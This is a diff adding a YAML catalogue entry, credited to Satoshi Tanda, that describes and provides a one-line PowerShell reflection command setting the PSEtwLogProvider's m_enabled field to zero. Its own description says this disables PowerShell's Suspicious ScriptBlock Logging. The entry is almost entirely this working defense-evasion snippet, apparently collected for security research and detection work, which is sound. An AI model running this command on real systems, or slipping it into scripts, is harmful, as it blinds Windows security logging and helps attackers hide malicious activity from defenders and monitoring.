@@ -1,0 +1,15 @@
+name: etw
+authors:
+  - name: Satoshi Tanda
+    handle: '@standa_t'
+    link: https://twitter.com/standa_t
+description: |
+  This PowerShell command sets 0 to System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled
+  which effectively disables Suspicious ScriptBlock Logging etc. Note that this command itself does not attempt
+  to bypass Suspicious ScriptBlock Logging for readability.
+comments:
+  - https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
+language: powershell
+min_language_version: '3'
+script: |
+  [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0);
